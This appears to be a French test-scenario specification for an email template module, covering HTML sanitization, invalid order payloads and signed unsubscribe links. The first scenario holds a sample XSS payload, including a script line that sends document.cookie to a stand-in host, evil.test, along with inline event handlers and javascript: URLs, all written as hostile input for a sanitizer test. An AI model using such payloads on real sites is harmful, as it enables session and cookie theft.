# Scénarios métier — Module 06 Templates

Personas :
- **Imane** — marketeuse FemiGlow (opérateur), édite les templates customs.
- **Système** — pipeline de rendu (transactionnel React + custom Handlebars).

---

## Scénario TPL-S1 — Le marketeur colle un HTML d'agence externe contenant du JS embarqué

**Objectif métier** : un email d'agence « clé en main » contient souvent des
trackers, des `<script>`, des handlers `onload`, des `javascript:` href. Le
système doit accepter le **rendu visuel** tout en neutralisant **toute** charge
active — sans que l'opérateur ait à nettoyer manuellement.

**Préconditions**
- Imane édite un template custom `promo-aid`.
- Elle colle un bloc HTML d'agence :
  ```html
  <div onmouseover="steal()">
    <img src="x" onerror="alert(document.cookie)">
    <a href="javascript:track()">Voir</a>
    <script>fetch('//evil.test?c='+document.cookie)</script>
    <style>body{background:url('javascript:alert(1)')}</style>
    <strong>Offre Aïd -30%</strong>
  </div>
  ```

**Étapes**
1. Imane colle ce HTML dans la source (via `{{{body}}}` ou directement comme
   `htmlSource`).
2. La preview debouncée appelle `POST .../preview` → rendu serveur via
   `renderTemplate` → `sanitizeEmailHtml`.
3. Elle observe l'aperçu iframe (`sandbox="allow-same-origin"`).
4. Elle crée une version.

**Oracles**
- Le HTML rendu/sanitizé ne contient **AUCUN** : `<script>`, `onerror=`,
  `onmouseover=`, `href="javascript:`, `expression(`, `url('javascript:` —
  couvert par la batterie `sanitize-hostile.test.ts`.
- Le contenu **légitime** est conservé : `<strong>Offre Aïd -30%</strong>`, les
  liens `https://`, les images `src` valides.
- L'iframe de preview est sandboxée (pas de same-origin script exécuté).
- La version persistée stocke la source telle quelle (la sanitization est
  appliquée **au rendu**, pas au stockage — le re-rendu reste sûr).

> Ce scénario matérialise l'écart **A-TPL-2** (surface XSS). C'est le test de
> sécurité central du module.

---

## Scénario TPL-S2 — Confirmation de commande avec un payload incomplet

**Objectif métier** : une commande dont la donnée `itemsCount` est manquante ou
invalide ne doit **jamais** produire un email perdu silencieusement.

**Préconditions**
- Le pipeline tente `renderTemplate('order-confirmation', payload)` avec
  `itemsCount = 0` (Zod exige `positive()`).

**Étapes**
1. Le pipeline appelle `renderTemplate` **avant** l'INSERT outbox.
2. `meta.schema.parse(payload)` échoue (Zod).

**Oracles (état cible vs écart A-TPL-1)**
- **Comportement actuel** : `renderTemplate` **throw** → si le pipeline ne capte
  pas l'erreur autour de l'INSERT, l'email est **perdu sans trace**. Le test
  `TPL-TRX-002` prouve le throw.
- **État cible** : le pipeline doit transformer ce throw en **ligne outbox
  `failed`** (ou un évènement d'échec) → traçable dans le cockpit. Le test de
  câblage (module 08) vérifie qu'un payload invalide laisse une trace, jamais un
  silence.
- Un payload **valide** produit `subject` contenant l'`orderId`, un HTML inline
  non vide et un texte alternatif — snapshot stable.

---

## Scénario TPL-S3 — Le lien de désinscription doit TOUJOURS être présent et signé

**Objectif métier** : conformité CNDP/RGPD — chaque email marketing/transactionnel
porte un lien de désinscription **fonctionnel** (signé), jamais un placeholder
littéral.

**Préconditions**
- Templates transactionnels rendus via le pipeline d'envoi (substitution de
  `{{unsubscribe_url}}` par une URL signée issue de `unsub-token.ts`).
- Cas dégradé : le secret de signature est manquant.

**Étapes**
1. Rendu d'un template transactionnel (ex. `order-confirmation`) → le HTML
   contient `href="{{unsubscribe_url}}"` (littéral, footer partagé).
2. Le pipeline substitue `{{unsubscribe_url}}` par l'URL signée.
3. Variante : secret manquant → le `catch{}` du pipeline est exercé.

**Oracles (état cible vs écart A-TPL-3)**
- L'email **final** envoyé ne doit JAMAIS contenir la chaîne brute
  `{{unsubscribe_url}}` (test `TPL-UNS-001`).
- L'URL substituée contient un **token signé** non vide (test `TPL-UNS-002`).
- `context-resolver` fournit toujours `unsubscribeUrl` non vide (test `TPL-UNS-003`).
- **Écart A-TPL-3** : si le secret manque et que le `catch{}` est vide, le
  placeholder littéral peut fuiter → le test rend ce cas visible (RED) et exige
  un fallback explicite (lien non signé temporaire OU blocage de l'envoi).
